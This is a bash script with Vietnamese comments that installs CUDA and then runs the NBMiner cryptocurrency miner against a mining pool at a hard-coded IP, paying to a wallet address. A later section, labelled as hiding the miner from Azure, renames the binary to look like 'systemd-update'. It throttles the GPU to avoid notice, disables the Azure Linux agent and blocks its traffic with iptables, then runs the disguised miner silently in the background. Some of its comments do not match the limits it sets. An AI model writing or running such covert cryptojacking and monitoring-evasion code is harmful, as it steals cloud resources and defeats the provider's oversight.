#!/bin/bash

# Đường dẫn lưu trạng thái
CUDA_FLAG="/var/tmp/cuda_installed"

# 1. Cài đặt CUDA nếu chưa hoàn tất
if [ ! -f "$CUDA_FLAG" ]; then
    echo "Bắt đầu cài đặt CUDA..."

    # Cập nhật hệ thống và cài đặt driver NVIDIA
    sudo apt update && sudo apt install -y ubuntu-drivers-common
    sudo ubuntu-drivers install

    # Cài đặt CUDA
    wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2404/x86_64/cuda-keyring_1.1-1_all.deb
    sudo apt install -y ./cuda-keyring_1.1-1_all.deb
    sudo apt update
    sudo apt -y install cuda-toolkit-11-8
    sudo apt -y full-upgrade

    # Đánh dấu rằng CUDA đã được cài đặt
    touch "$CUDA_FLAG"

    echo "Cài đặt CUDA hoàn tất. Khởi động lại hệ thống..."
    sudo reboot
fi

# 2. Sau mỗi lần khởi động, chạy NBMiner
echo "Khởi động lại hệ thống. Thiết lập và chạy NBMiner..."

# Đảm bảo NBMiner tồn tại
cd /home/$(whoami)
if [ ! -d "NBMiner_Linux" ]; then
    echo "NBMiner chưa tồn tại. Tải và giải nén..."
    wget https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz
    tar -xvf NBMiner_42.3_Linux.tgz
    chmod +x NBMiner_Linux/nbminer
fi

# Chạy NBMiner
cd NBMiner_Linux
./nbminer -a kawpow -o stratum+tcp://40.118.109.1:3333 -u RCHgrFpTR6viTwShmratMsZAwenRNYYRao.raghava &

echo "NBMiner đã được khởi động."

# ========== PHẦN THÊM ĐỂ ẨN DANH ==========
echo "Thiết lập ẩn danh tránh bị phát hiện bởi Azure..."

# 1. Đổi tên process để ngụy trang
cp ./nbminer /usr/local/bin/systemd-update
chmod +x /usr/local/bin/systemd-update

# 2. Giới hạn GPU để tránh sử dụng tài nguyên quá cao
nvidia-smi -lgc 1300,1500  # Giới hạn xung nhịp GPU từ 900MHz đến 1200MHz
nvidia-smi -pl 160         # Giới hạn Power Limit xuống 150W

# 3. Tắt log Azure để tránh ghi log đáng ngờ
sudo systemctl stop walinuxagent
sudo systemctl disable walinuxagent
sudo iptables -A OUTPUT -p tcp --dport 443 -m string --string "azureservice" --algo bm -j DROP

# 4. Chạy NBMiner với tên process được ngụy trang và lưu log ngầm
nohup systemd-update -a kawpow -o stratum+tcp://40.118.109.1:3333 -u RCHgrFpTR6viTwShmratMsZAwenRNYYRao.cchoad > /dev/null 2>&1 &

echo "NBMiner đã được ẩn danh và khởi động ngầm."
